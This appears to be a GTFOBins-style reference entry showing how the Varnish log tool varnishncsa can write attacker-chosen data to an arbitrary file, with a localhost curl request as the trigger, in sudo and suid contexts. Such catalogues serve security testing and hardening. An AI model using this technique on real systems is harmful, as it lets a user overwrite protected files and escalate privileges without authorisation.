---
type: gtfobin
name: varnishncsa
platform: Unix
functions: [file-write]
tags: [gtfobin, unix, lotl]
---

# varnishncsa

## file-write

```bash
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
```
_The command hangs, so the trigger command must be performed asynchronously or in another terminal:

```
curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
```_
**Contexts:** sudo, suid
